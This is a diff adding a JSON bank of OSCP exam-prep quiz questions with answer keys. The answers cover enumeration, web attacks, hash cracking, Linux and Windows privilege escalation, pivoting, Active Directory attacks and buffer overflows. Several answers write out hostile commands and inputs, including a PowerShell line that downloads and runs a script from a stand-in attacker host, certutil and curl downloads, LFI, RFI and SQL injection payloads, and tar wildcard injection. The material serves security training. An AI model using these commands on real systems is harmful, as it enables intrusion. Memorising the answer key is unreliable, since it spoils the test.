@@ -1,0 +1,723 @@
+{
+  "name": "OSCP",
+  "mode": "choice",
+  "certKey": "OSCP",
+  "retired": false,
+  "questions": [
+    {
+      "q": "You have a target IP and want a fast full TCP port sweep before deep enumeration. What nmap invocation identifies all open ports quickly?",
+      "choices": [
+        "nmap -sU <ip>",
+        "nmap -p- --min-rate 1000 -T4 <ip>",
+        "nmap -sn <ip>",
+        "nmap --traceroute <ip>"
+      ],
+      "correctIndex": 1,
+      "why": "-p- scans all 65535 TCP ports; --min-rate and -T4 speed it up. -sn is host discovery only and -sU is UDP.",
+      "difficulty": "easy",
+      "category": "Enumeration"
+    },
+    {
+      "q": "After finding open ports, you want service versions and default scripts against just those ports. What is the correct follow-up nmap command?",
+      "choices": [
+        "nmap -sS -p- <ip>",
+        "nmap -Pn -F <ip>",
+        "nmap -sC -sV -p 22,80,445 <ip>",
+        "nmap --top-ports 10 <ip>"
+      ],
+      "correctIndex": 2,
+      "why": "-sV grabs version banners and -sC runs default NSE scripts, targeted at the ports found earlier.",
+      "difficulty": "easy",
+      "category": "Enumeration"
+    },
+    {
+      "q": "An nmap scan shows port 445 open. Which tool best enumerates SMB shares and null-session access on a Linux attack box?",
+      "choices": [
+        "snmpwalk -v2c <ip>",
+        "showmount -e <ip>",
+        "rpcbind <ip>",
+        "smbclient -L //<ip> -N"
+      ],
+      "correctIndex": 3,
+      "why": "smbclient -L lists shares; -N attempts a null (no password) session, a classic SMB enumeration step.",
+      "difficulty": "easy",
+      "category": "Enumeration"
+    },
+    {
+      "q": "You need to enumerate exported NFS mounts on a target showing port 2049 open. Which command lists them?",
+      "choices": [
+        "showmount -e <ip>",
+        "nmap -sU -p 53 <ip>",
+        "enum4linux -a <ip>",
+        "smbmap -H <ip>"
+      ],
+      "correctIndex": 0,
+      "why": "showmount -e queries the NFS mountd service to list exported directories, revealing potential mountable shares.",
+      "difficulty": "medium",
+      "category": "Enumeration"
+    },
+    {
+      "q": "A web server hosts an unknown application. What is the best first step to discover hidden directories and files?",
+      "choices": [
+        "Run gobuster or feroxbuster with a directory wordlist",
+        "Brute force SSH with hydra",
+        "Run sqlmap against the homepage",
+        "Launch a full nmap UDP scan"
+      ],
+      "correctIndex": 0,
+      "why": "Content discovery tools like gobuster/feroxbuster brute force paths from a wordlist to map hidden endpoints.",
+      "difficulty": "easy",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "gobuster returns only 403 and 200 on a wildcard host. What flag helps you brute force by virtual host name instead of paths?",
+      "choices": [
+        "gobuster dns -d domain",
+        "gobuster vhost -u <url> -w <wordlist>",
+        "gobuster s3 -w <wordlist>",
+        "gobuster dir -x php"
+      ],
+      "correctIndex": 1,
+      "why": "gobuster vhost mode fuzzes the Host header to discover name-based virtual hosts on the same IP.",
+      "difficulty": "medium",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "A page loads content via ?page=about. You suspect Local File Inclusion. Which input best confirms LFI on a Linux target?",
+      "choices": [
+        "?page=http://attacker/shell.txt",
+        "?page=' OR '1'='1",
+        "?page=<script>alert(1)</script>",
+        "?page=../../../../etc/passwd"
+      ],
+      "correctIndex": 3,
+      "why": "Directory traversal to /etc/passwd is the classic LFI confirmation; readable system files prove file inclusion.",
+      "difficulty": "easy",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "You confirmed LFI and the target allows remote URLs in include(). What does this upgrade the vulnerability to?",
+      "choices": [
+        "Cross-site scripting",
+        "SQL injection",
+        "Server-side request forgery only",
+        "Remote File Inclusion (RFI) enabling remote code execution"
+      ],
+      "correctIndex": 3,
+      "why": "When allow_url_include is on, an attacker-hosted file can be included and executed, turning LFI into RFI/RCE.",
+      "difficulty": "medium",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "A login form errors differently for valid vs invalid usernames and reflects input into SQL. To confirm SQL injection manually, which payload is most diagnostic?",
+      "choices": [
+        "../../etc/shadow",
+        "' OR 1=1-- -",
+        "%00null%00",
+        "${jndi:ldap://x}"
+      ],
+      "correctIndex": 1,
+      "why": "A tautology like ' OR 1=1-- - alters query logic; a changed response confirms the input reaches SQL unsanitized.",
+      "difficulty": "easy",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "You have a GET parameter vulnerable to SQL injection and want to dump the database automatically. Which tool and flag list current databases?",
+      "choices": [
+        "sqlmap -u <url> --dbs",
+        "sqlmap -u <url> --os-shell only",
+        "hydra -L users <url>",
+        "nikto -h <url>"
+      ],
+      "correctIndex": 0,
+      "why": "sqlmap --dbs enumerates available databases once injection is confirmed, the standard first extraction step.",
+      "difficulty": "easy",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "A file upload form accepts images. You want a PHP webshell but .php is blocked. Which technique commonly bypasses naive extension filters?",
+      "choices": [
+        "Encode the payload in base64 in the filename",
+        "Upload a .docx macro file",
+        "Rename the file to shell.exe",
+        "Upload as shell.phtml or shell.php.jpg depending on server parsing"
+      ],
+      "correctIndex": 3,
+      "why": "Alternate PHP extensions like .phtml, or double extensions, can slip past blacklist filters if the server still executes them.",
+      "difficulty": "medium",
+      "category": "Web Attacks"
+    },
+    {
+      "q": "You captured NTLMv2 hashes with Responder. Which hashcat mode cracks NetNTLMv2 hashes?",
+      "choices": [
+        "hashcat -m 5600",
+        "hashcat -m 0",
+        "hashcat -m 1000",
+        "hashcat -m 1800"
+      ],
+      "correctIndex": 0,
+      "why": "Mode 5600 is NetNTLMv2. 1000 is NTLM, 0 is raw MD5, and 1800 is sha512crypt.",
+      "difficulty": "medium",
+      "category": "Password Attacks"
+    },
+    {
+      "q": "You dumped a Windows local hash and want to crack the NT portion. Which hashcat mode corresponds to a raw NTLM hash?",
+      "choices": [
+        "hashcat -m 3200",
+        "hashcat -m 500",
+        "hashcat -m 5600",
+        "hashcat -m 1000"
+      ],
+      "correctIndex": 3,
+      "why": "Mode 1000 is NTLM. 5600 is NetNTLMv2, 3200 is bcrypt, 500 is md5crypt.",
+      "difficulty": "medium",
+      "category": "Password Attacks"
+    },
+    {
+      "q": "You have a valid username and want to brute force SSH with a password list. Which hydra command is correct?",
+      "choices": [
+        "hydra -p admin -l rockyou.txt <ip> ssh",
+        "hydra ssh <ip> --wordlist rockyou.txt",
+        "hydra -L rockyou.txt ssh://<ip>",
+        "hydra -l admin -P rockyou.txt ssh://<ip>"
+      ],
+      "correctIndex": 3,
+      "why": "-l sets a single login, -P a password list, and ssh://<ip> the service. Uppercase -L would be a user list.",
+      "difficulty": "easy",
+      "category": "Password Attacks"
+    },
+    {
+      "q": "A Linux /etc/shadow line uses $6$ prefix. Which hashcat mode cracks it?",
+      "choices": [
+        "hashcat -m 7400",
+        "hashcat -m 1800",
+        "hashcat -m 1000",
+        "hashcat -m 500"
+      ],
+      "correctIndex": 1,
+      "why": "$6$ denotes sha512crypt, which is hashcat mode 1800. $1$ would be md5crypt (500) and $5$ sha256crypt (7400).",
+      "difficulty": "medium",
+      "category": "Password Attacks"
+    },
+    {
+      "q": "You want to generate a custom wordlist from words on a target company website. Which tool is designed for this?",
+      "choices": [
+        "cewl",
+        "john",
+        "cupp",
+        "crunch"
+      ],
+      "correctIndex": 0,
+      "why": "cewl spiders a URL and builds a wordlist from page content; crunch generates by pattern and cupp profiles a person.",
+      "difficulty": "medium",
+      "category": "Password Attacks"
+    },
+    {
+      "q": "After landing a low-priv Linux shell, which single command best surfaces SUID binaries for privilege escalation?",
+      "choices": [
+        "cat /proc/version",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "netstat -tulpn",
+        "ls -la /etc/passwd"
+      ],
+      "correctIndex": 1,
+      "why": "find with -perm -4000 locates files with the SUID bit set, prime candidates for escalation via GTFOBins.",
+      "difficulty": "easy",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "sudo -l shows you may run /usr/bin/find as root without a password. What is the standard escalation approach?",
+      "choices": [
+        "Overwrite /etc/passwd with vi",
+        "Use find's -exec to spawn a root shell (per GTFOBins)",
+        "Crack the root hash offline",
+        "Run a kernel exploit"
+      ],
+      "correctIndex": 1,
+      "why": "find . -exec /bin/sh \\; runs a shell with root privileges since sudo grants root; GTFOBins documents this.",
+      "difficulty": "medium",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "You find a world-writable script referenced by a root cron job running every minute. What is the escalation path?",
+      "choices": [
+        "Delete the cron file to gain root",
+        "Change your own shell in /etc/passwd",
+        "Edit the script to add a reverse shell or copy /bin/bash with SUID",
+        "Restart cron to reset permissions"
+      ],
+      "correctIndex": 2,
+      "why": "A root-executed writable script lets you inject commands that run as root on the next scheduled tick.",
+      "difficulty": "medium",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "An enumeration script flags the kernel as very old and unpatched. Before running a kernel exploit, what is the safest OSCP practice?",
+      "choices": [
+        "Reboot the machine to load a new kernel",
+        "Exhaust misconfiguration vectors first; kernel exploits can crash the box",
+        "Ignore kernel version entirely",
+        "Immediately run the first exploit-db result"
+      ],
+      "correctIndex": 1,
+      "why": "Kernel exploits are unstable and may panic the target; enumerate sudo, SUID, cron, and services first.",
+      "difficulty": "medium",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "A SUID binary calls system(\"service ...\") without an absolute path. Which technique exploits this?",
+      "choices": [
+        "Symlink /etc/shadow to the binary",
+        "Buffer overflow of the argument",
+        "PATH hijacking: create a malicious 'service' earlier in PATH",
+        "LD_PRELOAD with sudo NOPASSWD"
+      ],
+      "correctIndex": 2,
+      "why": "A relative command call lets you prepend a writable directory to PATH so your fake binary runs as root.",
+      "difficulty": "hard",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "You want an automated Linux privilege escalation enumeration script commonly used in OSCP labs. Which is it?",
+      "choices": [
+        "PowerUp.ps1",
+        "linpeas.sh",
+        "Seatbelt.exe",
+        "winPEAS.exe"
+      ],
+      "correctIndex": 1,
+      "why": "linpeas.sh enumerates Linux privesc vectors. winPEAS, PowerUp, and Seatbelt are Windows tools.",
+      "difficulty": "easy",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "On a Linux target you find a capability set with getcap. Which capability on a binary most directly leads to root?",
+      "choices": [
+        "cap_setuid+ep on an interpreter like python",
+        "cap_net_raw on ping",
+        "cap_chown on a log file",
+        "cap_dac_override on a config"
+      ],
+      "correctIndex": 0,
+      "why": "cap_setuid lets a program set its UID to 0; on python you can call os.setuid(0) then spawn a root shell.",
+      "difficulty": "hard",
+      "category": "Linux PrivEsc"
+    },
+    {
+      "q": "On Windows you have a low-priv shell. Which command lists services whose executable path is unquoted and contains spaces?",
+      "choices": [
+        "ipconfig /all",
+        "wmic service get name,pathname,startmode | findstr /i \"auto\" then inspect quotes",
+        "tasklist /svc",
+        "net user administrator"
+      ],
+      "correctIndex": 1,
+      "why": "Enumerating service pathnames reveals unquoted paths with spaces, exploitable if a parent directory is writable.",
+      "difficulty": "medium",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "You found an unquoted service path C:\\Program Files\\My App\\svc.exe writable at C:\\. Where do you place your payload?",
+      "choices": [
+        "C:\\Windows\\svc.exe",
+        "C:\\Program Files\\My App\\svc2.exe",
+        "C:\\Program.exe",
+        "C:\\Program Files\\My.exe"
+      ],
+      "correctIndex": 2,
+      "why": "Windows tries C:\\Program.exe first when the path is unquoted with spaces, running your payload as the service account.",
+      "difficulty": "hard",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "A service runs as SYSTEM and you have write access to its binary (BINARY_PATH_NAME). What is the escalation?",
+      "choices": [
+        "Run a kernel exploit only",
+        "Replace or reconfigure the binary and restart the service to run your payload as SYSTEM",
+        "Change your user password",
+        "Dump LSASS with no privileges"
+      ],
+      "correctIndex": 1,
+      "why": "Weak service permissions let you swap the executable or use sc config binPath, then restart for SYSTEM execution.",
+      "difficulty": "medium",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "whoami /priv shows SeImpersonatePrivilege enabled on a service account. Which class of exploit does this enable?",
+      "choices": [
+        "Pass-the-hash over SMB",
+        "Kerberoasting",
+        "DLL search order hijacking of explorer",
+        "Potato attacks (JuicyPotato, PrintSpoofer) to escalate to SYSTEM"
+      ],
+      "correctIndex": 3,
+      "why": "SeImpersonate lets potato-family tools impersonate SYSTEM tokens via named pipe/COM tricks to escalate.",
+      "difficulty": "hard",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "You want to run automated Windows privilege escalation checks in a modern .NET aware way. Which pair are appropriate tools?",
+      "choices": [
+        "BloodHound and sqlmap",
+        "linpeas and pspy",
+        "winPEAS and PowerUp",
+        "Responder and hydra"
+      ],
+      "correctIndex": 2,
+      "why": "winPEAS and PowerUp both enumerate Windows privesc vectors like services, DLLs, and unquoted paths.",
+      "difficulty": "easy",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "You have a foothold on a host that can reach an internal 10.10.x subnet you cannot. You have SSH access to the foothold. Which sets up a SOCKS proxy for tools?",
+      "choices": [
+        "ssh -D 1080 user@pivot then use proxychains",
+        "ssh -L 80:localhost:80 user@pivot",
+        "ssh -R 22:localhost:22 user@pivot",
+        "scp -r user@pivot:/ ."
+      ],
+      "correctIndex": 0,
+      "why": "-D creates a dynamic SOCKS proxy on 1080; proxychains routes tool traffic through the pivot into the internal net.",
+      "difficulty": "medium",
+      "category": "Pivoting"
+    },
+    {
+      "q": "You want to reach a single internal service (10.5.5.5:3306) from your attack box through an SSH pivot. Which forward is correct?",
+      "choices": [
+        "ssh -D 3306 user@pivot",
+        "ssh -N -g user@pivot",
+        "ssh -R 3306:10.5.5.5:3306 user@pivot",
+        "ssh -L 3306:10.5.5.5:3306 user@pivot"
+      ],
+      "correctIndex": 3,
+      "why": "Local port forward -L binds a local port and tunnels it to the remote host:port through the pivot.",
+      "difficulty": "medium",
+      "category": "Pivoting"
+    },
+    {
+      "q": "The compromised host cannot run an SSH server but you have a shell. Which tool creates a fast reverse SOCKS tunnel commonly used in OSCP?",
+      "choices": [
+        "socat readline",
+        "tcpdump -w",
+        "chisel (server on attacker, client reverse on target)",
+        "netcat -e only"
+      ],
+      "correctIndex": 2,
+      "why": "chisel builds an encrypted tunnel over HTTP; a reverse SOCKS client on the target gives you pivot access.",
+      "difficulty": "medium",
+      "category": "Pivoting"
+    },
+    {
+      "q": "You configured a SOCKS proxy on 127.0.0.1:1080. What must you edit so nmap and other tools route through it?",
+      "choices": [
+        "Edit /etc/hosts",
+        "Change the default route with ip route add",
+        "Add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf and prefix commands with proxychains",
+        "Set http_proxy environment variable only"
+      ],
+      "correctIndex": 2,
+      "why": "proxychains reads its config for the SOCKS entry; prefixing a command forces its TCP connections through the proxy.",
+      "difficulty": "easy",
+      "category": "Pivoting"
+    },
+    {
+      "q": "Through proxychains, which nmap options are required because SOCKS proxies only handle full TCP connections?",
+      "choices": [
+        "-O --traceroute",
+        "-sS -Pn",
+        "-sT -Pn (full connect, skip host discovery)",
+        "-sU -sV"
+      ],
+      "correctIndex": 2,
+      "why": "SOCKS cannot carry raw SYN packets, so -sT connect scan is required; -Pn skips ICMP discovery the proxy blocks.",
+      "difficulty": "hard",
+      "category": "Pivoting"
+    },
+    {
+      "q": "In an Active Directory environment, a service account has a SPN set. Which attack requests and cracks its Kerberos ticket offline?",
+      "choices": [
+        "Kerberoasting",
+        "Pass-the-hash",
+        "Golden ticket",
+        "LLMNR poisoning"
+      ],
+      "correctIndex": 0,
+      "why": "Kerberoasting requests TGS tickets for SPN accounts; the RC4 ticket is crackable offline to recover the password.",
+      "difficulty": "medium",
+      "category": "Active Directory"
+    },
+    {
+      "q": "You have valid domain credentials and want to request Kerberoastable hashes from a Linux box. Which Impacket tool does this?",
+      "choices": [
+        "secretsdump.py",
+        "GetNPUsers.py",
+        "psexec.py",
+        "GetUserSPNs.py"
+      ],
+      "correctIndex": 3,
+      "why": "GetUserSPNs.py queries for SPN accounts and outputs crackable TGS hashes. GetNPUsers is for AS-REP roasting.",
+      "difficulty": "medium",
+      "category": "Active Directory"
+    },
+    {
+      "q": "A domain user account has 'Do not require Kerberos preauthentication' set. Which attack retrieves a crackable hash without any password?",
+      "choices": [
+        "DCSync via secretsdump.py",
+        "Overpass-the-hash",
+        "Kerberoasting via GetUserSPNs.py",
+        "AS-REP Roasting via GetNPUsers.py"
+      ],
+      "correctIndex": 3,
+      "why": "Without preauth, the KDC returns an AS-REP encrypted with the user's key, crackable offline. GetNPUsers automates it.",
+      "difficulty": "medium",
+      "category": "Active Directory"
+    },
+    {
+      "q": "You recovered an NTLM hash for a local admin and want to authenticate to another host without cracking it. Which technique applies?",
+      "choices": [
+        "AS-REP roasting",
+        "Kerberoasting",
+        "Pass-the-hash (e.g., psexec.py -hashes)",
+        "Golden ticket"
+      ],
+      "correctIndex": 2,
+      "why": "NTLM authentication accepts the hash directly; pass-the-hash reuses it for lateral movement without the plaintext.",
+      "difficulty": "medium",
+      "category": "Active Directory"
+    },
+    {
+      "q": "You want to map AD attack paths (who can reach Domain Admins). Which collector feeds data into BloodHound?",
+      "choices": [
+        "Rubeus only",
+        "Mimikatz",
+        "CrackMapExec smb --shares",
+        "SharpHound"
+      ],
+      "correctIndex": 3,
+      "why": "SharpHound gathers AD objects, sessions, and ACLs into JSON that BloodHound ingests to graph attack paths.",
+      "difficulty": "easy",
+      "category": "Active Directory"
+    },
+    {
+      "q": "With domain admin or equivalent replication rights, which Impacket action extracts all domain hashes from a DC?",
+      "choices": [
+        "smbclient share listing",
+        "kerbrute userenum",
+        "GetUserSPNs.py",
+        "secretsdump.py performing a DCSync"
+      ],
+      "correctIndex": 3,
+      "why": "secretsdump.py uses the DRSUAPI (DCSync) to pull the NTDS.dit hashes, including krbtgt, from the domain controller.",
+      "difficulty": "hard",
+      "category": "Active Directory"
+    },
+    {
+      "q": "You have a list of usernames and want to validate which exist in a domain and spray a password over Kerberos. Which tool is purpose-built?",
+      "choices": [
+        "hashcat",
+        "responder",
+        "kerbrute",
+        "gobuster"
+      ],
+      "correctIndex": 2,
+      "why": "kerbrute performs fast username enumeration and password spraying via Kerberos pre-auth without locking as noisily.",
+      "difficulty": "medium",
+      "category": "Active Directory"
+    },
+    {
+      "q": "You want to execute commands on a Windows host over SMB using recovered credentials or a hash. Which Impacket script is standard?",
+      "choices": [
+        "GetNPUsers.py",
+        "ticketer.py",
+        "ntlmrelayx only for hashes",
+        "psexec.py or wmiexec.py"
+      ],
+      "correctIndex": 3,
+      "why": "psexec.py and wmiexec.py give command execution over SMB/WMI with a password or NTLM hash for lateral movement.",
+      "difficulty": "easy",
+      "category": "Active Directory"
+    },
+    {
+      "q": "You are developing a classic 32-bit Windows stack buffer overflow. After finding the crash, what is the correct next step to control EIP?",
+      "choices": [
+        "Fuzz UDP with random bytes forever",
+        "Overwrite the SEH chain without checking",
+        "Immediately send shellcode of random length",
+        "Send a cyclic pattern and use pattern_offset to find the exact EIP offset"
+      ],
+      "correctIndex": 3,
+      "why": "A unique cyclic pattern (msf-pattern) reveals the exact offset where the return address is overwritten.",
+      "difficulty": "medium",
+      "category": "Buffer Overflow"
+    },
+    {
+      "q": "In a stack overflow you control EIP and have space for shellcode. Which instruction do you typically overwrite EIP with to reach your payload on the stack?",
+      "choices": [
+        "The address of /bin/sh",
+        "The address of a JMP ESP instruction",
+        "A NULL pointer",
+        "The stack canary value"
+      ],
+      "correctIndex": 1,
+      "why": "JMP ESP redirects execution to ESP, which points at your shellcode; find one in a non-ASLR module with mona.",
+      "difficulty": "medium",
+      "category": "Buffer Overflow"
+    },
+    {
+      "q": "Before placing shellcode you must identify bad characters. What is the standard method in the OSCP overflow workflow?",
+      "choices": [
+        "Send all byte values 0x01-0xff and compare stack memory to spot corrupted bytes",
+        "Use only ASCII printable shellcode",
+        "Encode with shikata_ga_nai and skip testing",
+        "Assume only 0x00 is bad and continue"
+      ],
+      "correctIndex": 0,
+      "why": "Sending the full bytearray and diffing what lands in memory reveals which characters the app mangles or truncates.",
+      "difficulty": "medium",
+      "category": "Buffer Overflow"
+    },
+    {
+      "q": "You must generate Windows reverse shellcode for the overflow while excluding the null byte. Which msfvenom option specifies bad chars?",
+      "choices": [
+        "--platform none",
+        "-e x86/shikata --force",
+        "-p only",
+        "-b '\\x00'"
+      ],
+      "correctIndex": 3,
+      "why": "The -b flag tells msfvenom which bytes to avoid so the encoder produces payloads without those characters.",
+      "difficulty": "medium",
+      "category": "Buffer Overflow"
+    },
+    {
+      "q": "You have a limited non-interactive shell on Linux and want a fully interactive TTY. Which upgrade sequence is standard?",
+      "choices": [
+        "use nc -e without arguments",
+        "run exit and reconnect",
+        "cat /etc/passwd to spawn a shell",
+        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' then set stty raw and export TERM"
+      ],
+      "correctIndex": 3,
+      "why": "pty.spawn upgrades to a pseudo-terminal; combined with stty raw -echo and fg you get a fully interactive shell.",
+      "difficulty": "medium",
+      "category": "Enumeration"
+    },
+    {
+      "q": "SNMP is open on UDP 161 with a default community string. Which tool and community best enumerate system info?",
+      "choices": [
+        "smbclient -N <ip>",
+        "dig axfr @<ip>",
+        "snmpwalk -v2c -c public <ip>",
+        "hydra snmp <ip>"
+      ],
+      "correctIndex": 2,
+      "why": "snmpwalk with community 'public' dumps the MIB tree, often exposing processes, users, and network details.",
+      "difficulty": "medium",
+      "category": "Enumeration"
+    },
+    {
+      "q": "A DNS server on the target may allow zone transfers. Which command attempts to pull all records for a domain?",
+      "choices": [
+        "nslookup -type=A <domain>",
+        "nmap -sU -p 53 <ip>",
+        "dig axfr @<ip> <domain>",
+        "host -t mx <domain>"
+      ],
+      "correctIndex": 2,
+      "why": "dig axfr requests a full zone transfer; misconfigured servers hand over every record, mapping the internal namespace.",
+      "difficulty": "medium",
+      "category": "Enumeration"
+    },
+    {
+      "q": "You obtained a shell and need to transfer a Linux enum script to a target with curl available. Which host-side and target-side pairing works?",
+      "choices": [
+        "nc -lvnp with no listener on either side",
+        "scp from target with no credentials",
+        "python3 -m http.server on attacker, then curl http://attacker:8000/linpeas.sh on target",
+        "ftp anonymous upload to the target automatically"
+      ],
+      "correctIndex": 2,
+      "why": "A simple HTTP server plus curl/wget is the reliable OSCP file-transfer method when no SMB or SSH is available.",
+      "difficulty": "easy",
+      "category": "Enumeration"
+    },
+    {
+      "q": "On a Windows target without curl, which built-in method downloads a file from your attacker HTTP server?",
+      "choices": [
+        "certutil -urlcache -f http://attacker/file.exe file.exe",
+        "apt-get install file",
+        "scp automatically via WinRM",
+        "wget2 --mirror"
+      ],
+      "correctIndex": 0,
+      "why": "certutil is a signed Windows binary that can fetch files over HTTP, a common living-off-the-land transfer.",
+      "difficulty": "medium",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "You want a PowerShell one-liner reverse shell but the box blocks obvious downloads. Which native cmdlet fetches and runs remote script content in memory?",
+      "choices": [
+        "Get-Content only",
+        "IEX (New-Object Net.WebClient).DownloadString('http://attacker/s.ps1')",
+        "Import-Module ActiveDirectory",
+        "Set-ExecutionPolicy Bypass alone gives a shell"
+      ],
+      "correctIndex": 1,
+      "why": "Invoke-Expression with DownloadString runs a remote script in memory without touching disk, common in AD footholds.",
+      "difficulty": "medium",
+      "category": "Windows PrivEsc"
+    },
+    {
+      "q": "A web app runs as a service and you gained RCE. Before privilege escalation, what is the most important OSCP habit for exam scoring?",
+      "choices": [
+        "Grab the local.txt/proof, then take screenshots and note the exact commands used",
+        "Reboot the machine",
+        "Change the administrator password",
+        "Delete logs to stay stealthy"
+      ],
+      "correctIndex": 0,
+      "why": "The exam scores documented proof; capturing flags with screenshots and reproducible commands is essential for reporting.",
+      "difficulty": "easy",
+      "category": "Reporting"
+    },
+    {
+      "q": "When writing the OSCP exam report, which element is required for each compromised host to demonstrate a repeatable exploit?",
+      "choices": [
+        "Step-by-step commands, screenshots, and the proof.txt/local.txt contents",
+        "Only the final flag value with no steps",
+        "A marketing-style executive summary alone",
+        "A list of every tool installed on Kali"
+      ],
+      "correctIndex": 0,
+      "why": "Graders must reproduce the compromise; each host needs the exact methodology, evidence screenshots, and proof files.",
+      "difficulty": "easy",
+      "category": "Reporting"
+    },
+    {
+      "q": "You cracked a hash but the plaintext fails on the service. Which OSCP mindset step should you take before assuming the hash is wrong?",
+      "choices": [
+        "Assume the exam is broken and stop",
+        "Immediately reformat the target",
+        "Run every Metasploit module blindly",
+        "Reuse the credential across other services and hosts (password reuse) and verify the correct user"
+      ],
+      "correctIndex": 3,
+      "why": "Credential reuse across services and accounts is a core methodology; the plaintext may authenticate elsewhere.",
+      "difficulty": "medium",
+      "category": "Password Attacks"
+    },
+    {
+      "q": "You have write access to a PATH-writable directory and a root cron runs 'tar' with a wildcard on files you control. Which technique abuses this?",
+      "choices": [
+        "Overwriting the tar binary",
+        "Symlinking /etc/shadow into the archive",
+        "Setting LD_LIBRARY_PATH globally",
+        "Wildcard injection using tar --checkpoint-action to execute a script"
+      ],
+      "correctIndex": 3,
+      "why": "Crafted filenames like --checkpoint-action=exec are parsed as tar options, running your command as the cron's user.",
+      "difficulty": "hard",
+      "category": "Linux PrivEsc"
+    }
+  ]
+}
